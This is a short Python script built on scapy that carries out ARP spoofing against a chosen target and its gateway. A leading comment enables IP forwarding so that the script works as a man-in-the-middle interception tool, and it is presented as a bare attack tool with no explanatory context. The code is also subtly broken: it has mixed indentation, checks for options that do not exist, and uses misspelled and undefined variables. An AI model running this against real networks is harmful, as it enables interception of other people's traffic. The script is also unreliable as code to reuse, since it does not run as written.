#echo 1 > /proc/sys/net/ipv4/ip_forward
#!/usr/bin/env python3
import argparse
import scapy.all as scapy
import time

def get_arguments():
	parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target", dest="target_ip",help="IP of the target device")
    parser.add_argument("-g","--gateway", dest="gateway_ip",help="IP of the router or gateway")
    options = parser.parse_args()
	if not options.interface:
		parser.error("[-] Please specify a target IP, use --help for more info.")
		if not options.mac:
			parser.error("[-] Please specify a router or gateway IP, use --help for more info")
		return options

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

	return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sppof_ip)
	scapy.send(packet)

def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)

	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4)

options = get_arguments()

try:
	packets_sent_count = 0
	while True:
		spoof(options.target_ip, options.gateway_ip)
		spoof(options.gateway_ip, options.target_ip)
		packets_sent_count = packet_sent_count + 2
		print ("\r[+] Sent " + str(packets_sent_count), end="")
		time.sleep(1)
except KeyboardInterrupt:
	print ("\n[-] Detected CTRL + C .... Resetting ARP tables .... Please wait.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
	print ("[+] ARP tables restored.")
